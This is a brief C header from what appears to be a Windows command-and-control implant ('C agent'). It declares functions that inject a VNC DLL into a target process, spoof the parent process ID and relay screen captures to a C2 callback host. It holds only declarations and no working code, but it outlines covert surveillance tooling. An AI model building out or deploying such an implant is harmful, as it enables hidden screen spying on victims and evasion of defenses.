#pragma once
#ifdef _WIN32

/* VNC DLL injection + named pipe relay for the C agent.
 *
 * vnc_start_dll() — injects the embedded VNC DLL into targetPID,
 *                   connects to the named pipe, and relays frames to the C2.
 * vnc_start_ps()  — PowerShell CopyFromScreen path (direct, no injection).
 * vnc_stop()      — terminate current VNC session.
 */

void vnc_start_dll(const char *callback_host, int callback_port,
                   int quality, DWORD target_pid);
void vnc_start_ps (const char *callback_host, int callback_port,
                   int quality, DWORD ppid_spoof);
void vnc_stop(void);

#endif /* _WIN32 */
